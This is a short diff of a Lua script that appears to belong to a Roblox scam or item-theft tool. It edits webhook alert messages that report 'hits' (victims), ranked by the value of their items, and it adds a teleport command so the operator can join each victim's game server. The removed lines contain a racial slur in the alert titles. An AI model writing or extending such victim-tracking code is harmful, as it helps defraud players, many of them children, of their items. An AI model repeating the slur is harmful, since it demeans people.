@@ -231,7 +231,7 @@ local function SendJoinMessage(list, prefix)
         ["auth_token"] = auth_token, -- AJOUT : Token
         ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
         ["embeds"] = {{
-            ["title"] = (totalRAP >= 500) and "🟢 TARGET DETECTED 🎯" or "🟣 Bro join your hit nigga 🎯",
+            ["title"] = (totalRAP >= 500) and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯",
             ["color"] = embedColor,
             ["fields"] = fields,
             ["footer"] = {
@@ -302,7 +302,7 @@ local function SendMessage(list)
     local data = {
         ["auth_token"] = auth_token,
         ["embeds"] = {{
-            ["title"] = "🟣 The nigga is on the server 🎉" ,
+            ["title"] = "⚪ The hit on server 🎉" ,
             ["color"] = embedColor,
 			["fields"] = fields,
 			["footer"] = {
